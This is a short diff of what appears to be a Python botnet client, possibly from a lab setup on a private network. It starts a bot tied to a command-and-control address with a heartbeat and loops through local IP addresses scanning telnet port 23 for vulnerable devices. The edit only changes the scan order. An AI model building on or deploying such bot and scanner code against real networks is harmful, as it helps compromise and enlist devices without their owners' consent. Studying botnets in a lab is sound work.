@@ -18,7 +18,7 @@ bot1 = bot.bot("bot1")
 bot1.start_bot(cc_ip='192.168.100.11', heart_beat=5)
 
 while (1):
-    for index in range(6):
+    for index in range(5, -1, -1):
         devices = []
         # Scan network for vulnerable devices
         devices.append(bot1.scanner_init("192.168.100."+str(3+index), [23]))
